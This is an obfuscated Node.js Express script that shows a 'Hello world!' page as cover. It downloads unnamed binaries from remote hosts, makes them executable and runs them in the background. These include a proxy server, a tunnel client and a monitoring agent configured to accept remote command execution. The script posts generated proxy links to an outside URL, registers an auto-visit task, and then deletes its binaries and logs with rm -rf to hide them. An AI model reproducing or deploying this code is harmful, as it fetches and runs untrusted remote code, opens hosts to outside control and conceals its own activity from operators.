const _0x4102ed=_0x4eb2;(function(_0x20edde,_0x43d981){const _0xeea232=_0x4eb2,_0x101361=_0x20edde();while(!![]){try{const _0x443376=-parseInt(_0xeea232(0x1e2))/0x1+parseInt(_0xeea232(0x1f7))/0x2+-parseInt(_0xeea232(0x1d6))/0x3*(-parseInt(_0xeea232(0x1d4))/0x4)+-parseInt(_0xeea232(0x1b6))/0x5*(-parseInt(_0xeea232(0x1e7))/0x6)+parseInt(_0xeea232(0x23a))/0x7*(-parseInt(_0xeea232(0x25a))/0x8)+parseInt(_0xeea232(0x230))/0x9*(-parseInt(_0xeea232(0x23b))/0xa)+-parseInt(_0xeea232(0x1eb))/0xb;if(_0x443376===_0x43d981)break;else _0x101361['push'](_0x101361['shift']());}catch(_0x1a1d6f){_0x101361['push'](_0x101361['shift']());}}}(_0xbcef,0x88c6f));const express=require(_0x4102ed(0x266)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4102ed(0x207)),{promisify}=require(_0x4102ed(0x20f)),exec=promisify(require(_0x4102ed(0x243))[_0x4102ed(0x1ea)]),{execSync}=require(_0x4102ed(0x243)),UPLOAD_URL=process[_0x4102ed(0x20e)][_0x4102ed(0x235)]||'',PROJECT_URL=process[_0x4102ed(0x20e)][_0x4102ed(0x251)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x4102ed(0x1d9)]||_0x4102ed(0x26c),SUB_PATH=process[_0x4102ed(0x20e)][_0x4102ed(0x25b)]||_0x4102ed(0x1f5),PORT=process[_0x4102ed(0x20e)]['SERVER_PORT']||process[_0x4102ed(0x20e)][_0x4102ed(0x1b5)]||0xbb8,UUID=process[_0x4102ed(0x20e)][_0x4102ed(0x247)]||_0x4102ed(0x238),NEZHA_SERVER=process[_0x4102ed(0x20e)][_0x4102ed(0x21d)]||'',NEZHA_PORT=process[_0x4102ed(0x20e)][_0x4102ed(0x268)]||'',NEZHA_KEY=process[_0x4102ed(0x20e)][_0x4102ed(0x1ca)]||'',ARGO_DOMAIN=process[_0x4102ed(0x20e)][_0x4102ed(0x1c3)]||'',ARGO_AUTH=process[_0x4102ed(0x20e)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x4102ed(0x20e)]['ARGO_PORT']||0x1f41,CFIP=process[_0x4102ed(0x20e)][_0x4102ed(0x22c)]||_0x4102ed(0x24b),CFPORT=process['env'][_0x4102ed(0x20c)]||0x1bb,NAME=process[_0x4102ed(0x20e)][_0x4102ed(0x1b7)]||_0x4102ed(0x22a);!fs[_0x4102ed(0x1e3)](FILE_PATH)?(fs[_0x4102ed(0x1c5)](FILE_PATH),console[_0x4102ed(0x1dc)](FILE_PATH+_0x4102ed(0x24f))):console[_0x4102ed(0x1dc)](FILE_PATH+_0x4102ed(0x201));function _0xbcef(){const _0x3dcb7e=['https://amd64.ssss.nyc.mn/web','chmod','\x20already\x20exists','\x20is\x20running','https://arm64.ssss.nyc.mn/v1','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','isFile','charAt','path','\x22\x20>\x20/dev/null\x202>&1','readdirSync','unlinkSync','http','CFPORT','\x0a\x20\x20\x20\x20','env','util','test','clear','push','all','Empowerment\x20success\x20for\x20','writeFileSync','/dev/null','tcp','127.0.0.1','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tls','NEZHA_SERVER','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/v1','8443','pipe','fileUrl','arm','has','response','text/plain;\x20charset=utf-8','/trojan-argo','\x0a\x20\x20\x0atrojan://','rail1129','\x0a\x20\x20\x0avmess://','CFIP','/sub.txt\x20saved\x20successfully','win32','utf-8','2199933jWIczS','application/json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','substring','UPLOAD_URL','2087','true','853e0b59-c356-4560-8a5a-334b9f832bc1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','7AnTEBm','10XVEOKf','Add\x20automatic\x20access\x20task\x20faild:\x20','includes','none','forEach','map','\x20-c\x20','?encryption=none&security=tls&sni=','child_process','Empowerment\x20failed\x20for\x20','finish','config.json','UUID','\x20failed:\x20','--tls','/vmess-argo','cdns.doon.eu.org','\x20>/dev/null\x202>&1\x20&','split','trojan','\x20is\x20created','block','PROJECT_URL','post','App\x20is\x20running','https://arm64.ssss.nyc.mn/bot','del\x20/f\x20/q\x20','Error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/agent','catch','error','4013272eAtWRI','SUB_PATH','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','&path=%2Ftrojan-argo%3Fed%3D2560#','floor','quic','stream','filter','https+local://8.8.8.8/dns-query','http\x20server\x20is\x20running\x20on\x20port:','/api/add-subscriptions','express','\x20>\x20nul\x202>&1','NEZHA_PORT','message','tunnel.json','\x0a\x20\x20credentials-file:\x20','./tmp','2096','\x0a\x20\x20tunnel:\x20','Error\x20executing\x20command:\x20','join','stringify','amd','PORT','10xTqMVh','NAME','Subscription\x20uploaded\x20successfully','createWriteStream','basename','toString','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','config.yaml','\x20-s\x20','\x20-p\x20','Error\x20downloading\x20files:','ARGO_DOMAIN','taskkill\x20/f\x20/im\x20','mkdirSync','tunnel.yml','trim','freedom','ARGO_DOMAIN:','NEZHA_KEY','direct','from','ArgoDomain:','arm64','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','sub.txt','/tunnel.yml\x20run','firefox','6808CoguvM','https://oooo.serv00.net/add-url','1479zPJaVQ','length','boot.log','FILE_PATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/vless-argo','log','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','xtls-rprx-vision','https://arm64.ssss.nyc.mn/web','nohup\x20','readFileSync','180963hcvIZU','existsSync','then','send','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','3280980JmjBqS','fileName','443','exec','12701821pmBTfT','unshift','pkill\x20-f\x20\x22[','platform','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/api/add-nodes','aarch64','Unhandled\x20error\x20in\x20startserver:','\x0avless://','listen','sub','TunnelSecret','1418526cMIHPV','Download\x20','vless','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','blackhole','?security=tls&sni=','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','base64'];_0xbcef=function(){return _0x3dcb7e;};return _0xbcef();}function _0x4eb2(_0x241804,_0x5121a7){const _0xbcef65=_0xbcef();return _0x4eb2=function(_0x4eb206,_0x5af202){_0x4eb206=_0x4eb206-0x1b1;let _0x3e6f2d=_0xbcef65[_0x4eb206];return _0x3e6f2d;},_0x4eb2(_0x241804,_0x5121a7);}function generateRandomName(){const _0x4b76c0=_0x4102ed,_0x2c1af5='abcdefghijklmnopqrstuvwxyz';let _0x175ba1='';for(let _0x5de52a=0x0;_0x5de52a<0x6;_0x5de52a++){_0x175ba1+=_0x2c1af5['charAt'](Math[_0x4b76c0(0x25f)](Math['random']()*_0x2c1af5['length']));}return _0x175ba1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4102ed(0x1b2)](FILE_PATH,phpName),webPath=path[_0x4102ed(0x1b2)](FILE_PATH,webName),botPath=path[_0x4102ed(0x1b2)](FILE_PATH,botName),subPath=path[_0x4102ed(0x1b2)](FILE_PATH,_0x4102ed(0x1d1)),listPath=path[_0x4102ed(0x1b2)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x4102ed(0x1b2)](FILE_PATH,_0x4102ed(0x246));function deleteNodes(){const _0x287a96=_0x4102ed;try{if(!UPLOAD_URL)return;if(!fs[_0x287a96(0x1e3)](subPath))return;let _0x34efb8;try{_0x34efb8=fs[_0x287a96(0x1e1)](subPath,_0x287a96(0x22f));}catch{return null;}const _0x4c6795=Buffer[_0x287a96(0x1cc)](_0x34efb8,_0x287a96(0x1fe))['toString'](_0x287a96(0x22f)),_0x387d2e=_0x4c6795[_0x287a96(0x24d)]('\x0a')[_0x287a96(0x262)](_0x43c17e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x43c17e));if(_0x387d2e[_0x287a96(0x1d7)]===0x0)return;return axios[_0x287a96(0x252)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x287a96(0x1b3)]({'nodes':_0x387d2e}),{'headers':{'Content-Type':_0x287a96(0x231)}})['catch'](_0x4e6868=>{return null;}),null;}catch(_0x812a06){return null;}}function cleanupOldFiles(){const _0x26e27f=_0x4102ed;try{const _0x5b321e=fs[_0x26e27f(0x209)](FILE_PATH);_0x5b321e[_0x26e27f(0x23f)](_0x28381f=>{const _0x196fa8=_0x26e27f,_0x3a0433=path[_0x196fa8(0x1b2)](FILE_PATH,_0x28381f);try{const _0x4cadea=fs['statSync'](_0x3a0433);_0x4cadea[_0x196fa8(0x205)]()&&fs[_0x196fa8(0x20a)](_0x3a0433);}catch(_0x15dc73){}});}catch(_0xd723b0){}}app['get']('/',function(_0x22007d,_0x725a53){const _0x22429c=_0x4102ed;_0x725a53[_0x22429c(0x1e5)]('Hello\x20world!');});async function generateConfig(){const _0x516f63=_0x4102ed,_0x18c81e={'log':{'access':_0x516f63(0x216),'error':'/dev/null','loglevel':_0x516f63(0x23e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x516f63(0x1f9),'settings':{'clients':[{'id':UUID,'flow':_0x516f63(0x1de)}],'decryption':_0x516f63(0x23e),'fallbacks':[{'dest':0xbb9},{'path':_0x516f63(0x1db),'dest':0xbba},{'path':_0x516f63(0x24a),'dest':0xbbb},{'path':_0x516f63(0x228),'dest':0xbbc}]},'streamSettings':{'network':_0x516f63(0x217)}},{'port':0xbb9,'listen':_0x516f63(0x218),'protocol':_0x516f63(0x1f9),'settings':{'clients':[{'id':UUID}],'decryption':_0x516f63(0x23e)},'streamSettings':{'network':_0x516f63(0x217),'security':_0x516f63(0x23e)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x516f63(0x1f9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x516f63(0x23e)},'streamSettings':{'network':'ws','security':_0x516f63(0x23e),'wsSettings':{'path':_0x516f63(0x1db)}},'sniffing':{'enabled':!![],'destOverride':[_0x516f63(0x20b),_0x516f63(0x21c),_0x516f63(0x260)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x516f63(0x218),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x516f63(0x20b),_0x516f63(0x21c),_0x516f63(0x260)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x516f63(0x218),'protocol':_0x516f63(0x24e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x516f63(0x228)}},'sniffing':{'enabled':!![],'destOverride':[_0x516f63(0x20b),_0x516f63(0x21c),_0x516f63(0x260)],'metadataOnly':![]}}],'dns':{'servers':[_0x516f63(0x263)]},'outbounds':[{'protocol':_0x516f63(0x1c8),'tag':_0x516f63(0x1cb)},{'protocol':_0x516f63(0x1fb),'tag':_0x516f63(0x250)}]};fs[_0x516f63(0x215)](path[_0x516f63(0x1b2)](FILE_PATH,_0x516f63(0x246)),JSON[_0x516f63(0x1b3)](_0x18c81e,null,0x2));}function getSystemArchitecture(){const _0x31cd86=_0x4102ed,_0xfd105e=os['arch']();return _0xfd105e===_0x31cd86(0x224)||_0xfd105e===_0x31cd86(0x1ce)||_0xfd105e===_0x31cd86(0x1f1)?_0x31cd86(0x224):_0x31cd86(0x1b4);}function downloadFile(_0x41aa75,_0x135d63,_0x5a6a2b){const _0x5bd43f=_0x4102ed,_0x597034=_0x41aa75;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x34a4ed=fs[_0x5bd43f(0x1b9)](_0x597034);axios({'method':'get','url':_0x135d63,'responseType':_0x5bd43f(0x261)})[_0x5bd43f(0x1e4)](_0x3aa6c3=>{const _0x45211b=_0x5bd43f;_0x3aa6c3['data'][_0x45211b(0x222)](_0x34a4ed),_0x34a4ed['on'](_0x45211b(0x245),()=>{const _0xcab942=_0x45211b;_0x34a4ed['close'](),console[_0xcab942(0x1dc)]('Download\x20'+path[_0xcab942(0x1ba)](_0x597034)+'\x20successfully'),_0x5a6a2b(null,_0x597034);}),_0x34a4ed['on']('error',_0x495bc6=>{const _0x396614=_0x45211b;fs['unlink'](_0x597034,()=>{});const _0x57b10f=_0x396614(0x1f8)+path[_0x396614(0x1ba)](_0x597034)+_0x396614(0x248)+_0x495bc6['message'];console[_0x396614(0x259)](_0x57b10f),_0x5a6a2b(_0x57b10f);});})[_0x5bd43f(0x258)](_0x16254f=>{const _0xb106f8=_0x5bd43f,_0x6185aa=_0xb106f8(0x1f8)+path[_0xb106f8(0x1ba)](_0x597034)+'\x20failed:\x20'+_0x16254f[_0xb106f8(0x269)];console[_0xb106f8(0x259)](_0x6185aa),_0x5a6a2b(_0x6185aa);});}async function downloadFilesAndRun(){const _0x2d068a=_0x4102ed,_0x260d58=getSystemArchitecture(),_0x43cea8=getFilesForArchitecture(_0x260d58);if(_0x43cea8[_0x2d068a(0x1d7)]===0x0){console['log'](_0x2d068a(0x1be));return;}const _0x219713=_0x43cea8[_0x2d068a(0x240)](_0x4dae86=>{return new Promise((_0x2c89c4,_0x55b698)=>{const _0x3d8217=_0x4eb2;downloadFile(_0x4dae86[_0x3d8217(0x1e8)],_0x4dae86[_0x3d8217(0x223)],(_0x1f1e52,_0x127bb7)=>{_0x1f1e52?_0x55b698(_0x1f1e52):_0x2c89c4(_0x127bb7);});});});try{await Promise[_0x2d068a(0x213)](_0x219713);}catch(_0x3964ed){console[_0x2d068a(0x259)](_0x2d068a(0x1c2),_0x3964ed);return;}function _0x50eafc(_0x28cee9){const _0x3650ea=_0x2d068a,_0x435bd6=0x1fd;_0x28cee9[_0x3650ea(0x23f)](_0x1a1d1e=>{const _0x2d4429=_0x3650ea;fs[_0x2d4429(0x1e3)](_0x1a1d1e)&&fs[_0x2d4429(0x200)](_0x1a1d1e,_0x435bd6,_0x47fd6a=>{const _0x1bd394=_0x2d4429;_0x47fd6a?console['error'](_0x1bd394(0x244)+_0x1a1d1e+':\x20'+_0x47fd6a):console[_0x1bd394(0x1dc)](_0x1bd394(0x214)+_0x1a1d1e+':\x20'+_0x435bd6['toString'](0x8));});});}const _0x2d9fa4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x50eafc(_0x2d9fa4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31dea6=NEZHA_SERVER[_0x2d068a(0x23d)](':')?NEZHA_SERVER[_0x2d068a(0x24d)](':')['pop']():'',_0x340226=new Set([_0x2d068a(0x1e9),_0x2d068a(0x221),_0x2d068a(0x26d),_0x2d068a(0x236),'2083',_0x2d068a(0x219)]),_0x5a8a9d=_0x340226[_0x2d068a(0x225)](_0x31dea6)?_0x2d068a(0x237):'false',_0x320860='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2d068a(0x1da)+NEZHA_SERVER+_0x2d068a(0x21f)+_0x5a8a9d+_0x2d068a(0x1ef)+UUID;fs[_0x2d068a(0x215)](path[_0x2d068a(0x1b2)](FILE_PATH,_0x2d068a(0x1bf)),_0x320860);const _0x54c65c='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2d068a(0x232);try{await exec(_0x54c65c),console[_0x2d068a(0x1dc)](phpName+'\x20is\x20running'),await new Promise(_0x10aecb=>setTimeout(_0x10aecb,0x3e8));}catch(_0x1fb73f){console['error']('php\x20running\x20error:\x20'+_0x1fb73f);}}else{let _0x2b6147='';const _0x28f32f=[_0x2d068a(0x1e9),'8443','2096',_0x2d068a(0x236),'2083',_0x2d068a(0x219)];_0x28f32f[_0x2d068a(0x23d)](NEZHA_PORT)&&(_0x2b6147=_0x2d068a(0x249));const _0x15f76c=_0x2d068a(0x1e0)+npmPath+_0x2d068a(0x1c0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d068a(0x1c1)+NEZHA_KEY+'\x20'+_0x2b6147+_0x2d068a(0x1e6);try{await exec(_0x15f76c),console[_0x2d068a(0x1dc)](npmName+_0x2d068a(0x202)),await new Promise(_0x43de01=>setTimeout(_0x43de01,0x3e8));}catch(_0x1b9e90){console[_0x2d068a(0x259)]('npm\x20running\x20error:\x20'+_0x1b9e90);}}}else console[_0x2d068a(0x1dc)](_0x2d068a(0x21e));const _0x15fc60='nohup\x20'+webPath+_0x2d068a(0x241)+FILE_PATH+_0x2d068a(0x1cf);try{await exec(_0x15fc60),console['log'](webName+'\x20is\x20running'),await new Promise(_0x3bc4cc=>setTimeout(_0x3bc4cc,0x3e8));}catch(_0x48ad66){console['error']('web\x20running\x20error:\x20'+_0x48ad66);}if(fs[_0x2d068a(0x1e3)](botPath)){let _0x365d89;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x365d89='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x365d89=_0x2d068a(0x1fa)+FILE_PATH+_0x2d068a(0x1d2):_0x365d89=_0x2d068a(0x239)+FILE_PATH+_0x2d068a(0x1fd)+ARGO_PORT;try{await exec(_0x2d068a(0x1e0)+botPath+'\x20'+_0x365d89+'\x20>/dev/null\x202>&1\x20&'),console[_0x2d068a(0x1dc)](botName+_0x2d068a(0x202)),await new Promise(_0x5fdc97=>setTimeout(_0x5fdc97,0x7d0));}catch(_0x35124e){console[_0x2d068a(0x259)](_0x2d068a(0x1b1)+_0x35124e);}}await new Promise(_0x3eee24=>setTimeout(_0x3eee24,0x1388));}function getFilesForArchitecture(_0x5ce407){const _0x30265c=_0x4102ed;let _0x56412b;_0x5ce407===_0x30265c(0x224)?_0x56412b=[{'fileName':webPath,'fileUrl':_0x30265c(0x1df)},{'fileName':botPath,'fileUrl':_0x30265c(0x254)}]:_0x56412b=[{'fileName':webPath,'fileUrl':_0x30265c(0x1ff)},{'fileName':botPath,'fileUrl':_0x30265c(0x1d0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3e7dc1=_0x5ce407===_0x30265c(0x224)?_0x30265c(0x257):_0x30265c(0x25d);_0x56412b[_0x30265c(0x1ec)]({'fileName':npmPath,'fileUrl':_0x3e7dc1});}else{const _0x3aea38=_0x5ce407===_0x30265c(0x224)?_0x30265c(0x203):_0x30265c(0x220);_0x56412b[_0x30265c(0x1ec)]({'fileName':phpPath,'fileUrl':_0x3aea38});}}return _0x56412b;}function argoType(){const _0x3caf61=_0x4102ed;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x3caf61(0x1dd));return;}if(ARGO_AUTH[_0x3caf61(0x23d)](_0x3caf61(0x1f6))){fs[_0x3caf61(0x215)](path[_0x3caf61(0x1b2)](FILE_PATH,_0x3caf61(0x26a)),ARGO_AUTH);const _0x3e981e=_0x3caf61(0x26e)+ARGO_AUTH[_0x3caf61(0x24d)]('\x22')[0xb]+_0x3caf61(0x26b)+path[_0x3caf61(0x1b2)](FILE_PATH,_0x3caf61(0x26a))+_0x3caf61(0x1bd)+ARGO_DOMAIN+_0x3caf61(0x21b)+ARGO_PORT+_0x3caf61(0x21a);fs[_0x3caf61(0x215)](path[_0x3caf61(0x1b2)](FILE_PATH,_0x3caf61(0x1c6)),_0x3e981e);}else console[_0x3caf61(0x1dc)](_0x3caf61(0x233));}argoType();async function extractDomains(){const _0x581ee4=_0x4102ed;let _0x2059ff;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2059ff=ARGO_DOMAIN,console['log'](_0x581ee4(0x1c9),_0x2059ff),await _0x58e7f3(_0x2059ff);else try{const _0x6a8771=fs['readFileSync'](path[_0x581ee4(0x1b2)](FILE_PATH,'boot.log'),_0x581ee4(0x22f)),_0x25f68c=_0x6a8771[_0x581ee4(0x24d)]('\x0a'),_0x37b929=[];_0x25f68c[_0x581ee4(0x23f)](_0x1a0837=>{const _0x89d129=_0x581ee4,_0x4ff814=_0x1a0837['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4ff814){const _0x1737bb=_0x4ff814[0x1];_0x37b929[_0x89d129(0x212)](_0x1737bb);}});if(_0x37b929[_0x581ee4(0x1d7)]>0x0)_0x2059ff=_0x37b929[0x0],console[_0x581ee4(0x1dc)](_0x581ee4(0x1cd),_0x2059ff),await _0x58e7f3(_0x2059ff);else{console[_0x581ee4(0x1dc)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x581ee4(0x20a)](path[_0x581ee4(0x1b2)](FILE_PATH,_0x581ee4(0x1d8)));async function _0xa0f76b(){const _0x5c39e8=_0x581ee4;try{process[_0x5c39e8(0x1ee)]==='win32'?await exec(_0x5c39e8(0x1c4)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5c39e8(0x1ed)+botName[_0x5c39e8(0x206)](0x0)+']'+botName[_0x5c39e8(0x234)](0x1)+_0x5c39e8(0x208));}catch(_0x11ace6){}}_0xa0f76b(),await new Promise(_0xfdf8c5=>setTimeout(_0xfdf8c5,0xbb8));const _0x13b943='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x581ee4(0x1fd)+ARGO_PORT;try{await exec(_0x581ee4(0x1e0)+botPath+'\x20'+_0x13b943+_0x581ee4(0x24c)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x238896=>setTimeout(_0x238896,0xbb8)),await extractDomains();}catch(_0x6f191b){console[_0x581ee4(0x259)]('Error\x20executing\x20command:\x20'+_0x6f191b);}}}catch(_0x399d19){console[_0x581ee4(0x259)]('Error\x20reading\x20boot.log:',_0x399d19);}async function _0x58e7f3(_0x4152d5){const _0x3c25db=_0x581ee4,_0x5aad42=execSync(_0x3c25db(0x204),{'encoding':_0x3c25db(0x22f)}),_0x5fe299=_0x5aad42[_0x3c25db(0x1c7)](),_0x55b367=NAME?NAME+'-'+_0x5fe299:_0x5fe299;return new Promise(_0xa505a4=>{setTimeout(()=>{const _0x5dfedd=_0x4eb2,_0x48b75c={'v':'2','ps':''+_0x55b367,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5dfedd(0x23e),'net':'ws','type':_0x5dfedd(0x23e),'host':_0x4152d5,'path':_0x5dfedd(0x25c),'tls':'tls','sni':_0x4152d5,'alpn':'','fp':_0x5dfedd(0x1d3)},_0x14617f=_0x5dfedd(0x1f3)+UUID+'@'+CFIP+':'+CFPORT+_0x5dfedd(0x242)+_0x4152d5+'&fp=firefox&type=ws&host='+_0x4152d5+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x55b367+_0x5dfedd(0x22b)+Buffer['from'](JSON[_0x5dfedd(0x1b3)](_0x48b75c))[_0x5dfedd(0x1bb)](_0x5dfedd(0x1fe))+_0x5dfedd(0x229)+UUID+'@'+CFIP+':'+CFPORT+_0x5dfedd(0x1fc)+_0x4152d5+'&fp=firefox&type=ws&host='+_0x4152d5+_0x5dfedd(0x25e)+_0x55b367+_0x5dfedd(0x20d);console[_0x5dfedd(0x1dc)](Buffer['from'](_0x14617f)[_0x5dfedd(0x1bb)](_0x5dfedd(0x1fe))),fs['writeFileSync'](subPath,Buffer['from'](_0x14617f)[_0x5dfedd(0x1bb)](_0x5dfedd(0x1fe))),console[_0x5dfedd(0x1dc)](FILE_PATH+_0x5dfedd(0x22d)),uploadNodes(),app['get']('/'+SUB_PATH,(_0xaf2e72,_0xc1260b)=>{const _0x2b5e2c=_0x5dfedd,_0x259bc1=Buffer[_0x2b5e2c(0x1cc)](_0x14617f)[_0x2b5e2c(0x1bb)](_0x2b5e2c(0x1fe));_0xc1260b['set']('Content-Type',_0x2b5e2c(0x227)),_0xc1260b[_0x2b5e2c(0x1e5)](_0x259bc1);}),_0xa505a4(_0x14617f);},0x7d0);});}}async function uploadNodes(){const _0x2282f1=_0x4102ed;if(UPLOAD_URL&&PROJECT_URL){const _0x11954d=PROJECT_URL+'/'+SUB_PATH,_0x8cc9e2={'subscription':[_0x11954d]};try{const _0x3c2894=await axios[_0x2282f1(0x252)](UPLOAD_URL+_0x2282f1(0x265),_0x8cc9e2,{'headers':{'Content-Type':_0x2282f1(0x231)}});return _0x3c2894&&_0x3c2894['status']===0xc8?(console[_0x2282f1(0x1dc)](_0x2282f1(0x1b8)),_0x3c2894):null;}catch(_0x1505a7){if(_0x1505a7[_0x2282f1(0x226)]){if(_0x1505a7[_0x2282f1(0x226)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5ace05=fs['readFileSync'](listPath,'utf-8'),_0x2de391=_0x5ace05['split']('\x0a')[_0x2282f1(0x262)](_0x5c86ef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2282f1(0x210)](_0x5c86ef));if(_0x2de391[_0x2282f1(0x1d7)]===0x0)return;const _0x42e9c6=JSON[_0x2282f1(0x1b3)]({'nodes':_0x2de391});try{const _0x39159d=await axios['post'](UPLOAD_URL+_0x2282f1(0x1f0),_0x42e9c6,{'headers':{'Content-Type':_0x2282f1(0x231)}});return _0x39159d&&_0x39159d['status']===0xc8?(console[_0x2282f1(0x1dc)]('Nodes\x20uploaded\x20successfully'),_0x39159d):null;}catch(_0x468294){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2b123f=_0x4eb2,_0x5d4f80=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d4f80[_0x2b123f(0x212)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5d4f80[_0x2b123f(0x212)](phpPath);process[_0x2b123f(0x1ee)]===_0x2b123f(0x22e)?exec(_0x2b123f(0x255)+_0x5d4f80[_0x2b123f(0x1b2)]('\x20')+_0x2b123f(0x267),_0x3165cd=>{const _0x1295ea=_0x2b123f;console[_0x1295ea(0x211)](),console[_0x1295ea(0x1dc)](_0x1295ea(0x253)),console[_0x1295ea(0x1dc)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x5d4f80[_0x2b123f(0x1b2)]('\x20')+'\x20>/dev/null\x202>&1',_0x4582c6=>{const _0x3172f6=_0x2b123f;console[_0x3172f6(0x211)](),console[_0x3172f6(0x1dc)](_0x3172f6(0x253)),console[_0x3172f6(0x1dc)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2be2b3=_0x4102ed;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2be2b3(0x1dc)](_0x2be2b3(0x1bc));return;}try{const _0x585c0a=await axios[_0x2be2b3(0x252)](_0x2be2b3(0x1d5),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2be2b3(0x1dc)]('automatic\x20access\x20task\x20added\x20successfully'),_0x585c0a;}catch(_0x35834f){return console['error'](_0x2be2b3(0x23c)+_0x35834f[_0x2be2b3(0x269)]),null;}}async function startserver(){const _0x3510ed=_0x4102ed;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5028d9){console[_0x3510ed(0x259)](_0x3510ed(0x256),_0x5028d9);}}startserver()['catch'](_0x419943=>{const _0x217bb4=_0x4102ed;console[_0x217bb4(0x259)](_0x217bb4(0x1f2),_0x419943);}),app[_0x4102ed(0x1f4)](PORT,()=>console[_0x4102ed(0x1dc)](_0x4102ed(0x264)+PORT+'!'));
